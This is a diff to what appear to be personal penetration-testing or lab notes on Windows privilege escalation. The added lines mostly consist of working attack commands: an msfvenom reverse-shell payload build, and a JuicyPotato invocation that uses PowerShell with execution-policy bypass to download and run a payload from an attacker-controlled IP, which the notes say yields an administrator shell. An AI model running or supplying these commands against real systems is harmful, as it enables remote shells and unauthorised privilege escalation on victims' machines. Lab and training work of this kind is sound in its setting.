@@ -28,10 +28,16 @@ meterpreter >
 
 
 incognito.exe list_tokens -u
-
+incognito seems not working. 
 whoami /priv
 
-Creating payload:  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.14.242 LPORT=443 -f exe >rev64.exe
+Creating payload:  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.14.242 LPORT=443 -f exe >rev.exe
+First downlaod the revshell to the windows.
+Get the CLSID from here https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md based on the windows version from the systeminfo command.
+
+JuicyPotato.exe -l 1337 -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}" -p rev.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.13.14.242:8080/rev.exe')" -t *
+
+This gives admin privilege shell. 
 
 
 
